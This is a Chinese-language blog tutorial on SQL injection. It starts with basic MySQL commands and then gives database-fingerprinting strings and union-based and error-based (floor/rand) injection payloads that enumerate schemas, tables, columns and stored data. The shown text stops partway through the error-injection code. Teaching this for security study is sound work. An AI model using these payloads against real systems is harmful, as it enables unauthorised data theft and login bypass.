

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/Avatar.jpg">
  <link rel="icon" href="/img/Avatar.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="suuuu">
  <meta name="keywords" content="blog">
  
    <meta name="description" content="数据库操作MYSQLmysql对大小写不敏感每句话都要以;结尾 基础语句总结：   语句 含义    mysql -u&lt;用户名&gt; -p&lt;密码&gt; 连接数据库   show databases; 查询数据库   create database &lt;数据库名&gt; 创建名为&lt;数据库名&gt;的数据库   use &lt;数据库名&gt;； 使用名为&lt;数据库名&amp;g">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入">
<meta property="og:url" content="https://www.susec.xyz/2024/11/11/SQL%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="suuuu&#39;s blog">
<meta property="og:description" content="数据库操作MYSQLmysql对大小写不敏感每句话都要以;结尾 基础语句总结：   语句 含义    mysql -u&lt;用户名&gt; -p&lt;密码&gt; 连接数据库   show databases; 查询数据库   create database &lt;数据库名&gt; 创建名为&lt;数据库名&gt;的数据库   use &lt;数据库名&gt;； 使用名为&lt;数据库名&amp;g">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311902459.png">
<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311903462.png">
<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311904953.png">
<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311907683.png">
<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311907152.png">
<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311912226.png">
<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311915142.png">
<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311926002.png">
<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311926865.png">
<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408312007847.png">
<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408312010640.png">
<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408312020292.png">
<meta property="article:published_time" content="2024-11-11T03:11:11.000Z">
<meta property="article:modified_time" content="2025-03-09T09:10:42.372Z">
<meta property="article:author" content="suuuu">
<meta property="article:tag" content="WEB">
<meta property="article:tag" content="TOP10">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311902459.png">
  
  
  
  <title>SQL注入 - suuuu&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"www.susec.xyz","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>suuuu</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/BlackRoses.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="SQL注入"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-11-11 11:11" pubdate>
          2024年11月11日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          8.9k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          75 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">SQL注入</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h1><h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>mysql对大小写不敏感<br>每句话都要以;结尾</p>
<h3 id="基础语句总结："><a href="#基础语句总结：" class="headerlink" title="基础语句总结："></a>基础语句总结：</h3><table>
<thead>
<tr>
<th>语句</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>mysql -u&lt;用户名&gt; -p&lt;密码&gt;</td>
<td>连接数据库</td>
</tr>
<tr>
<td>show databases;</td>
<td>查询数据库</td>
</tr>
<tr>
<td>create database &lt;数据库名&gt;</td>
<td>创建名为&lt;数据库名&gt;的数据库</td>
</tr>
<tr>
<td>use &lt;数据库名&gt;；</td>
<td>使用名为&lt;数据库名&gt;的数据库</td>
</tr>
<tr>
<td>drop database &lt;数据库名&gt;</td>
<td>删除名为&lt;数据库名&gt;的数据库</td>
</tr>
<tr>
<td>create table &lt;表名&gt;(<br>&lt;列名&gt; &lt;数据类型&gt;&lt;数据最大长度&gt; &lt;其余属性&gt;,<br>&lt;列名&gt; &lt;数据类型&gt;&lt;数据最大长度&gt; &lt;其余属性&gt;,<br>……<br>);</td>
<td>创建一个名为&lt;表名&gt;的表，并生成有确定属性的列</td>
</tr>
<tr>
<td>insert into &lt;表名&gt;(&lt;列名1&gt;，&lt;列名2&gt;,…) values(‘&lt;数据&gt;’,’&lt;数据&gt;’,…);</td>
<td>向&lt;表名&gt;中插入数据</td>
</tr>
<tr>
<td>select &lt;列名&gt; from &lt;表名&gt;;</td>
<td>查询&lt;表名&gt;中的数据，当&lt;列名&gt;为<code>*</code>即查询整个表</td>
</tr>
<tr>
<td>update &lt;表名&gt; set &lt;列名&gt;&#x3D;&lt;新的数据&gt; where &lt;列名&gt;&#x3D;&lt;数据&gt;</td>
<td>更新数据</td>
</tr>
<tr>
<td>delete from &lt;表明&gt; where &lt;列名&gt;&#x3D;&lt;数据&gt;</td>
<td>删除数据</td>
</tr>
</tbody></table>
<h3 id="操作演示"><a href="#操作演示" class="headerlink" title="操作演示"></a>操作演示</h3><h4 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h4><p><code>mysql -uroot -p&lt;密码&gt;</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311902459.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311903462.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>出现 mysql&gt; 即为连接成功</p>
<h4 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h4><p>show databases;<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311904953.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><p>create database lianxi;    创建名为lianxi的数据库<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311907683.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>此时再查询数据库，就会看到lianxi<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311907152.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="选中数据库"><a href="#选中数据库" class="headerlink" title="选中数据库"></a>选中数据库</h4><p>use lianxi;    选中数据库lianxi<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311912226.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h4><p>drop database lianxi;  删除数据库lianxi<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311915142.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h4><p> create table biao1(                                                          &#x2F;&#x2F;创建名为biao1的表<br>    -&gt; id int(10) not null primary key auto_increment,&#x2F;&#x2F;创建一个列名为id，整数型，最大长度为10，不能为空，设定为主键（在这个表中每一个值都是唯一的，不会有重复），自增<br>    -&gt; name char(20) not null,                                      &#x2F;&#x2F;列名name，字符型，最大长度20，不为空<br>    -&gt; age int(8) not null,<br>    -&gt; sex char(20) not null<br>    -&gt; );<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311926002.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>其它的属性：</p>
<table>
<thead>
<tr>
<th>名字</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>primary key</td>
<td>指定表的主键</td>
</tr>
<tr>
<td>auto_increment</td>
<td>指定字段为自增字段，该字段的类型必须为int或bigint才能设置为自增字段</td>
</tr>
<tr>
<td>not null|null</td>
<td>设置字段能否取空值</td>
</tr>
<tr>
<td>default</td>
<td>设置字段的默认值</td>
</tr>
<tr>
<td>index</td>
<td>用来创建索引<br>idx_name指定索引名，该参数可以省略，如果省略则索引名就是字段名</td>
</tr>
<tr>
<td>foreign key</td>
<td>指定外键</td>
</tr>
<tr>
<td>engine</td>
<td>设置引擎类型，常用的有innoDB和myISAM引擎</td>
</tr>
<tr>
<td>default charset</td>
<td>设置表所用的字符集</td>
</tr>
</tbody></table>
<h4 id="查询表"><a href="#查询表" class="headerlink" title="查询表"></a>查询表</h4><p>show tables;                       查询表<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311926865.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h4><p>插入数据以及查询<br>insert into biao1(name,age,sex) values(‘e1even’,’20’,’男’)；   &#x2F;&#x2F;插入数据<br>select * from biao1;                                                                  &#x2F;&#x2F;查询整个表<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408312007847.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>也可以选我们想要的内容看<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408312010640.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h4><p>update biao1 set name&#x3D;’hex2bin_0xF’ where id&#x3D;1;<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408312020292.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>至此的基本增删改查结束</p>
<h1 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h1><h2 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h2><ul>
<li>绕过登录验证：万能密码</li>
<li>获取敏感数据：查询</li>
<li>文件系统操作：列目录，读取写入文件</li>
<li>注册表操作：读取写入删除注册表等</li>
<li>执行系统命令：远程执行命令</li>
</ul>
<h2 id="数据库分类"><a href="#数据库分类" class="headerlink" title="数据库分类"></a>数据库分类</h2><p>MYSQL,MSSQL(sql server),oracle,PostgreSQL,access</p>
<h3 id="判断方式"><a href="#判断方式" class="headerlink" title="判断方式"></a>判断方式</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-comment">//判断是否是Mysql数据库</span><br>and <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> information_schema.tables)  <span class="hljs-meta">#</span><br><br><span class="hljs-comment">//判断是否是 access数据库</span><br>and <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> msysobjects) <span class="hljs-meta">#</span><br><br><span class="hljs-comment">//判断是否是 Sqlserver数据库</span><br>and <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> sysobjects) <span class="hljs-meta">#&#x27;</span><br><br><span class="hljs-comment">//oracle</span><br>and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> sys.user_tables)&gt;<span class="hljs-number">0</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><br><span class="hljs-comment">//postgresql</span><br>;<span class="hljs-keyword">select</span> pg_sleep(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>

<h3 id="对应特征"><a href="#对应特征" class="headerlink" title="对应特征"></a>对应特征</h3><h4 id="MYSQL-1"><a href="#MYSQL-1" class="headerlink" title="MYSQL"></a>MYSQL</h4><p>mysql在5.0之后默认有一个名为information_schema的数据库，这个库里的内容都是只读的，这里有三个很重要的表</p>
<p>information_schema.<strong>schemata</strong>，记录所有库名</p>
<p>information_schema.<strong>tables</strong>，记录所有表名</p>
<p>information_schema.<strong>columns</strong>，记录所有列名</p>
<p>以下是常见函数</p>
<p>version():查询数据库的版本<br>user():查询数据库的使用者<br>database():数据库<br>system_user():系统用户名<br>session_user():连接数据库的用户名<br>current_user():当前用户名<br>load_file():读取本地文件<br>@@datadir:读取数据库路径<br>@@basedir:mysql安装路径<br>@@version_complie_os:查看操作系统</p>
<p>以下是注释符号</p>
<p>– -,–+,#</p>
<h4 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h4><p><strong>系统视图</strong></p>
<ul>
<li><code>sys.databases</code>：记录所有数据库信息</li>
<li><code>sys.tables</code>：记录所有表名</li>
<li><code>sys.columns</code>：记录所有列名</li>
</ul>
<p><strong>常见函数</strong></p>
<ul>
<li><code>@@VERSION</code>：查询数据库版本</li>
<li><code>USER_NAME()</code>：查询当前用户</li>
<li><code>DB_NAME()</code>：查询当前数据库</li>
<li><code>SYSTEM_USER</code>：系统用户名</li>
<li><code>SESSION_USER</code>：会话用户名</li>
<li><code>OPENROWSET()</code>：读取外部数据</li>
</ul>
<p><strong>注释符号</strong></p>
<ul>
<li><code>--</code>（单行注释）</li>
<li><code>/* */</code>（多行注释）</li>
</ul>
<h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><p><strong>系统视图</strong></p>
<ul>
<li><code>ALL_TABLES</code>：记录所有可访问表</li>
<li><code>ALL_TAB_COLUMNS</code>：记录所有列信息</li>
<li><code>USER_TABLES</code>：记录当前用户的所有表</li>
</ul>
<p><strong>常见函数</strong></p>
<ul>
<li><code>USER</code>：当前用户</li>
<li><code>CURRENT_USER</code>：连接用户</li>
<li><code>SYSDATE</code>：当前日期和时间</li>
<li><code>VERSION</code>：数据库版本</li>
</ul>
<p><strong>注释符号</strong></p>
<ul>
<li><code>--</code>（单行注释）</li>
<li><code>/* */</code>（多行注释）</li>
</ul>
<h4 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><p><strong>系统视图</strong></p>
<ul>
<li><code>pg_catalog.pg_database</code>：记录所有数据库</li>
<li><code>pg_catalog.pg_tables</code>：记录所有表</li>
<li><code>pg_catalog.pg_columns</code>：记录所有列</li>
</ul>
<p><strong>常见函数</strong></p>
<ul>
<li><code>current_database()</code>：当前数据库名</li>
<li><code>current_user</code>：当前用户</li>
<li><code>version()</code>：数据库版本</li>
<li><code>current_schema()</code>：当前模式</li>
</ul>
<p><strong>注释符号</strong></p>
<ul>
<li><code>--</code>（单行注释）</li>
<li><code>/* */</code>（多行注释）</li>
</ul>
<h4 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h4><p><strong>系统视图</strong></p>
<ul>
<li>访问数据表通过 <code>MSysObjects</code> 系统表查看数据库对象</li>
</ul>
<p><strong>常见函数</strong></p>
<ul>
<li><code>CurrentUser()</code>：当前用户</li>
<li><code>CurrentDb()</code>：当前数据库</li>
<li><code>Version()</code>：数据库版本</li>
</ul>
<p><strong>注释符号</strong></p>
<ul>
<li><code>&#39;</code>（单行注释，用于SQL语句）</li>
<li><code>/* */</code>（多行注释）</li>
</ul>
<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><h3 id="基于响应"><a href="#基于响应" class="headerlink" title="基于响应"></a>基于响应</h3><p>联合注入，报错注入，时间盲注，布尔盲注，堆叠注入</p>
<h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>常规流程</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//爆字段数<br><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> #<br>//爆回显<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> #<br>//爆信息<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> version(),<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">database</span>() #<br>//爆库名<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) #<br>//爆表名<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=&lt;数据库名&gt; #<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = &lt;数据库名&gt;) #<br>//爆列名<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;&lt;数据库名&gt;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;&lt;表名&gt;&#x27;</span> #<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span> = <span class="hljs-string">&#x27;&lt;表名&gt;&#x27;</span>) #<br>//爆字段<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(&lt;列名&gt;,<span class="hljs-string">&#x27;--&#x27;</span>,&lt;列名&gt;,<span class="hljs-string">&#x27;--&#x27;</span>,&lt;列名&gt;) <span class="hljs-keyword">from</span> &lt;表名/库名.表名&gt; #<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(&lt;列名<span class="hljs-number">1</span>&gt;) <span class="hljs-keyword">from</span> &lt;表名&gt;),(<span class="hljs-keyword">select</span> group_concat(&lt;列名<span class="hljs-number">2</span>&gt;) <span class="hljs-keyword">from</span> &lt;表名&gt;),(<span class="hljs-keyword">select</span> group_concat(&lt;列名<span class="hljs-number">3</span>&gt;) <span class="hljs-keyword">from</span> &lt;表名&gt;)<br></code></pre></td></tr></table></figure>

<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>floor函数</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat(database(),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a) --+<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> concat(version(),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))<br><span class="hljs-built_in">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (SELECT <span class="hljs-built_in">distinct</span> concat(<span class="hljs-number">0x7e</span>,schema_name,<span class="hljs-number">0x7e</span>) FROM information_schema.schemata LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a)  <span class="hljs-comment">//爆数据库</span><br><span class="hljs-built_in">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (SELECT <span class="hljs-built_in">distinct</span> concat(<span class="hljs-number">0x7e</span>,table_name,<span class="hljs-number">0x7e</span>) FROM information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database() LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">//爆表</span><br><span class="hljs-built_in">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (SELECT <span class="hljs-built_in">distinct</span> concat(<span class="hljs-number">0x7e</span>,column_name,<span class="hljs-number">0x7e</span>) FROM information_schema.columns <span class="hljs-built_in">where</span> table_name=表名 LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span 